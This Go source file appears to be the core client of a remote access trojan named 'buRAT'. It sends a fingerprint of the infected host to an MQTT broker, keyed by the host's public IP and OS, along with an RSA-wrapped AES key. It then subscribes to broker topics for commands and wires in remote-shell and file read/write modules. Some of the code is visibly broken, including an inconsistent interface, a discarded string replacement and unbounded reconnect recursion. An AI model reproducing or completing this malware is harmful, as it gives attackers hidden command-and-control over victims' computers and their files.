package burat

import(
  "../internals"
  "../bushido"

  "github.com/eclipse/paho.mqtt.golang"

  "crypto/rand"
  "encoding/hex"

  "runtime"
  "net/http"
  "io/ioutil"
  "strings"
  "fmt"
  "time"
  "encoding/base64"
)

type _profile struct {
  Id              string  `msgpack:"id"`
  Host            string  `msgpack:"host"`
  Os              string  `msgpack:"os"`
  Ip              string  `msgpack:"ip"`
  Status          string  `msgpack:"status"`
  Aes             _aes    `msgpack:"aes"`
}

type _aes struct {
  Key   []byte  `msgpack:"key"`
  Iv    []byte  `msgpack:"iv"`
}

type _internals struct {
  Mqtt            mqtt.Client
  Serialization   internals.Serialization
  RSA             internals.RSA
  AES             internals.AES
  Digest          internals.Digest
}

type _bushido struct {
  RemoteShell     bushido.BuRemoteShell
  FileRW          bushido.BuFileRW
}

type buRAT struct {
  id              string
  host            string
  os              string
  ip              string
  status          string
  _internals       _internals
  _bushido         _bushido
  _topics         map[string]string
  _mqttOptions    mqtt.ClientOptions
}

type BuRAT interface {
  Id()
  Host()
  Os()
  Ip()
  Status()
  Internals()
  Bushido()
  Profile() string
  Seen(packet interface{}) []byte
  Decryse(data []byte, packet interface{})
  AddTopicCallback(topic string, block func (client mqtt.Client, msg mqtt.Message))
  Publish(id string, topic string, qos byte, retain bool, payload []byte)
  AddTopics()
  Connect()
}

func NewBuRAT() *buRAT {
  b := &buRAT {
    id: id(),
    host: host(),
    os: os(),
    ip: ip(),
    status: "offline",
    _internals: _internals {
      //Mqtt:           test(),
      Serialization:  internals.NewSerialization(),
      RSA:            internals.NewRSA(),
      AES:            internals.NewAES(),
      Digest:         internals.NewDigest(),
    },
    _bushido: _bushido {
      RemoteShell:    bushido.NewBuRemoteShell(),
      FileRW:         bushido.NewBuFileRW(),
    },
  }
  return b
}

func (b *buRAT) Id() string { return b.id }
func (b *buRAT) Host() string { return b.host }
func (b *buRAT) Os() string { return b.os }
func (b *buRAT) Ip() string { return b.ip }
func (b *buRAT) Status() string { return b.status }
func (b *buRAT) Internals() _internals { return b._internals }
func (b *buRAT) Bushido() _bushido { return b._bushido }

func (b *buRAT) Profile() string {
  profile := _profile {
    Id: b.id,
    Host: b.host,
    Os: b.os,
    Ip: b.ip,
    Status: b.status,
    Aes: _aes {
      Key: b._internals.AES.Key(),
      Iv: b._internals.AES.Iv(),
    },
  }
  p := b._internals.Serialization.Serialize(profile)
  p = b._internals.RSA.Encrypt(p)
  s := base64.StdEncoding.EncodeToString(p)
  return s
}

func (b *buRAT) Seen(packet interface{}) []byte {
  data := b._internals.Serialization.Serialize(packet)
  data = b._internals.AES.Encrypt(data)
  return data
}

func (b *buRAT) Decryse(data []byte, packet interface{}) {
  data = b._internals.AES.Decrypt(data)
  b._internals.Serialization.Deserialize(data, packet)
}

func (b *buRAT) AddTopicCallback(topic string, block func (client mqtt.Client, msg mqtt.Message)) {
  topic = b._topics[topic]
  b._internals.Mqtt.Subscribe(topic, 2, block)
}

func (b *buRAT) Publish(id string, topic string, qos byte, retain bool, payload []byte) {
  topic = b._topics[topic]
  strings.Replace(topic, "+", b._internals.Digest.Digest(id), -1)
  b._internals.Mqtt.Publish(topic, qos, retain, payload)
}

func (b *buRAT) AddTopics(topics map[string]string) {
  for k, v := range topics {
    if strings.Contains(v, "BURAT") {
      v = strings.Replace(v, "BURAT", b.id, -1)
      topics[k] = v
    }
    topics[k] = b.digestTopic(v)
  }
  b._topics = topics
}

func (b *buRAT) Connect() {
  if token := b._internals.Mqtt.Connect(); token.Wait() && token.Error() != nil {
		fmt.Println(token.Error())
    time.Sleep(11000 * time.Millisecond)
    b.Connect()
	}
}

func (b *buRAT) digestTopic(topic string) string {
  levels := strings.Split(topic, "/")
  for i, l := range levels {
    if l != "+" && l != "#" {
      levels[i] = b._internals.Digest.Digest(l)
    }
  }
  topic = strings.Join(levels, "/")
  return topic
}

func id() string {
  val, _ := randomHex(2)
  return val
}

func host() string {
  switch os := runtime.GOOS; os {
	case "linux":
    return "reed"
  case "windows":
    return "leoneil"
	default:
		return "unkown"
	}
}

func os() string {
  return runtime.GOOS
}

func ip() string {
  resp, _ := http.Get("http://whatismyip.akamai.com")
  defer resp.Body.Close()
  body, _ := ioutil.ReadAll(resp.Body)
  return string(body)
}

func (b *buRAT) MqttConfig(server string,) {
  opts := mqtt.NewClientOptions()
  opts.AddBroker(server)
  opts.SetOnConnectHandler(func (client mqtt.Client) {
    b.status = "online"
    client.Publish(b._topics["bushi"], 2, false, b.Profile())
  })
  opts.SetWill(b._topics["bushi"], b.Profile(), 2, false)
  b._internals.Mqtt = mqtt.NewClient(opts)
}

func randomHex(n int) (string, error) {
  bytes := make([]byte, n)
  if _, err := rand.Read(bytes); err != nil {
    return "", err
  }
  return hex.EncodeToString(bytes), nil
}
